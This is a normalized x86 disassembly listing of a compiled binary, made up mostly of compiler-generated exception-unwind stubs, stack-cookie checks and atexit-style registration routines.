jmp sub_100702e0
sub_1008a30d
lea ecx [ ebp - 0x330 ]
jmp sub_100702e0
sub_1008a318
lea ecx [ ebp - 0x34c ]
jmp sub_100702e0
sub_1008a323
lea ecx [ ebp - 0x370 ]
jmp sub_100702e0
sub_1008a32e
lea ecx [ ebp - 0x370 ]
jmp sub_100702e0
sub_1008a339
lea ecx [ ebp - 0x34c ]
jmp sub_100702e0
sub_1008a344
lea ecx [ ebp - 0x330 ]
jmp sub_100702e0
sub_1008a34f
lea ecx [ ebp - 0x370 ]
jmp sub_100702e0
sub_1008a35a
lea ecx [ ebp - 0x34c ]
jmp sub_100702e0
sub_1008a365
lea ecx [ ebp - 0x330 ]
jmp sub_100702e0
sub_1008a370
lea ecx [ ebp - 0x370 ]
jmp sub_100702e0
sub_1008a37b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x404 ]
mov ecx [ edx - 0x408 ]
xor ecx eax
call sub_10032529
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10032529
mov eax r--data
jmp sub_100021b9
sub_1008a3b0
lea esi [ ebp - 0x3e0 ]
jmp sub_10030710
sub_1008a3bb
lea esi [ ebp - 0x370 ]
jmp sub_100603e0
sub_1008a3c6
lea eax [ ebp - 0x3c8 ]
jmp sub_10054bf0
sub_1008a3d1
lea ecx [ ebp - 0x34c ]
jmp sub_100702e0
sub_1008a3dc
lea ecx [ ebp - 0x34c ]
jmp sub_100702e0
sub_1008a3e7
lea ecx [ ebp - 0x370 ]
jmp sub_100702e0
sub_1008a3f2
lea ecx [ ebp - 0x34c ]
jmp sub_100702e0
sub_1008a3fd
lea ecx [ ebp - 0x330 ]
jmp sub_100702e0
sub_1008a408
lea ecx [ ebp - 0x370 ]
jmp sub_100702e0
sub_1008a413
lea ecx [ ebp - 0x370 ]
jmp sub_100702e0
sub_1008a41e
lea ecx [ ebp - 0x330 ]
jmp sub_100702e0
sub_1008a429
lea ecx [ ebp - 0x34c ]
jmp sub_100702e0
sub_1008a434
lea ecx [ ebp - 0x370 ]
jmp sub_100702e0
sub_1008a43f
lea ecx [ ebp - 0x330 ]
jmp sub_100702e0
sub_1008a44a
lea ecx [ ebp - 0x34c ]
jmp sub_100702e0
sub_1008a455
lea ecx [ ebp - 0x370 ]
jmp sub_100702e0
sub_1008a460
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x3f4 ]
mov ecx [ edx - 0x3f8 ]
xor ecx eax
call sub_10032529
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10032529
mov eax r--data
jmp sub_100021b9
sub_1008a490
lea esi [ ebp - 0x3f0 ]
jmp sub_10030710
sub_1008a49b
lea eax [ ebp - 0x3d8 ]
jmp sub_10054bf0
sub_1008a4a6
lea ecx [ ebp - 0x37c ]
jmp sub_100702e0
sub_1008a4b1
lea ecx [ ebp - 0x37c ]
jmp sub_100702e0
sub_1008a4bc
lea ecx [ ebp - 0x360 ]
jmp sub_100702e0
sub_1008a4c7
lea ecx [ ebp - 0x37c ]
jmp sub_100702e0
sub_1008a4d2
lea ecx [ ebp - 0x360 ]
jmp sub_100702e0
sub_1008a4dd
lea ecx [ ebp - 0x37c ]
jmp sub_100702e0
sub_1008a4e8
lea ecx [ ebp - 0x344 ]
jmp sub_100702e0
sub_1008a4f3
lea ecx [ ebp - 0x360 ]
jmp sub_100702e0
sub_1008a4fe
lea ecx [ ebp - 0x344 ]
jmp sub_100702e0
sub_1008a509
lea ecx [ ebp - 0x37c ]
jmp sub_100702e0
sub_1008a514
lea ecx [ ebp - 0x360 ]
jmp sub_100702e0
sub_1008a51f
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x3fc ]
mov ecx [ edx - 0x400 ]
xor ecx eax
call sub_10032529
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10032529
mov eax r--data
jmp sub_100021b9
sub_1008a550
lea ecx [ ebp - 0x60 ]
jmp sub_100702e0
sub_1008a558
lea edi [ ebp - 0x68 ]
jmp sub_1005b920
sub_1008a560
lea edi [ ebp - 0x68 ]
jmp sub_1005b920
sub_1008a568
lea edi [ ebp - 0x68 ]
jmp sub_1005b920
sub_1008a570
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10032529
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10032529
mov eax r--data
jmp sub_100021b9
sub_1008a5a0
lea esi [ ebp - 0x570 ]
jmp sub_1000f410
sub_1008a5ab
lea ecx [ ebp - 0x58c ]
jmp sub_10003250
sub_1008a5b6
lea ecx [ ebp - 0x4f4 ]
jmp sub_10003250
sub_1008a5c1
lea ecx [ ebp - 0x52c ]
jmp sub_10003250
sub_1008a5cc
lea ecx [ ebp - 0x510 ]
jmp sub_10003250
sub_1008a5d7
lea ecx [ ebp - 0x510 ]
jmp sub_100702e0
sub_1008a5e2
mov eax [ ebp - 0x594 ]
push eax
call sub_1000a86e
pop ecx
retn
sub_1008a5f0
lea ecx [ ebp - 0x52c ]
jmp sub_10003250
sub_1008a5fb
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x594 ]
mov ecx [ edx - 0x598 ]
xor ecx eax
call sub_10032529
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10032529
mov eax r--data
jmp sub_100021b9
sub_1008a630
mov ecx rw-data
jmp sub_100702e0
sub_1008a63a
mov ecx rw-data
jmp sub_100702e0
sub_1008a644
mov ecx rw-data
jmp sub_100702e0
sub_1008a64e
mov ecx rw-data
jmp sub_100702e0
sub_1008a658
mov ecx rw-data
jmp sub_100702e0
sub_1008a662
mov esi rw-data
jmp sub_100476c0
sub_1008a66c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10032529
mov eax r--data
jmp sub_100021b9
sub_1008a690
call sub_1005e390
push sub_1008acf0
call sub_10064546
pop ecx
retn
sub_1008a9f0
mov [ rw-data ] 0x0
retn
sub_1008aa00
push sub_1008af30
call sub_10064546
pop ecx
retn
sub_1008aa10
push 0x0
push r--data
mov ecx rw-data
call sub_1003e780
push sub_1008ad20
call sub_10064546
pop ecx
retn
sub_1008aa30
push 0x0
push r--data
mov ecx rw-data
call sub_1003e780
push sub_1008ad50
call sub_10064546
pop ecx
retn
sub_1008aa50
push 0x0
push r--data
mov ecx rw-data
call sub_1003e780
push sub_1008ad80
call sub_10064546
pop ecx
retn
sub_1008ac69
push sub_1008af97
call sub_10064546
pop ecx
retn
sub_1008ac75
push sub_1008afa2
call sub_10064546
pop ecx
retn
sub_1008ac81
push sub_1008afad
call sub_10064546
pop ecx
retn
sub_1008ac8d
push sub_1008afc2
call sub_10064546
pop ecx
retn
sub_1008ac99
push sub_1008afb8
call sub_10064546
pop ecx
retn
sub_1008aca5
mov ecx rw-data
call sub_1004e334
push sub_1008afcc
call sub_10064546
pop ecx
retn
sub_1008acbb
mov ecx rw-data
call sub_1004e334
push sub_1008afff
call sub_10064546
pop ecx
retn
sub_1008acd1
push sub_1008b009
call sub_10064546
pop ecx
retn
sub_1008ace0
push r-xdata
call sub_10064546
pop ecx
retn
sub_1008acf0
mov ecx rw-data
jmp sub_10051470
j_sub_1004c810
jmp sub_1004c810
sub_1008ad10
retn
sub_1008ad20
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_1000a86e
add esp 0x4
sub_1008ad50
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_1000a86e
add esp 0x4
sub_1008ad80
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_1000a86e
add esp 0x4
sub_1008af83
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_1000fcc7
sub_1008af97
mov [ rw-data ] r--data
retn
sub_1008afa2
mov [ rw-data ] r--data
retn
sub_1008afad
mov [ rw-data ] r--data
retn
sub_1008afb8
mov ecx rw-data
jmp sub_1002be90
sub_1008afc2
mov ecx rw-data
jmp sub_1004279c
sub_1008afcc
mov ecx rw-data
jmp sub_100206d7
sub_1008afd6
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_1000fcc7
sub_1008afea
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_1000fcc7
sub_1008afff
mov ecx rw-data
jmp sub_100206d7
sub_1008b009
mov ecx rw-data
jmp sub_10015a48
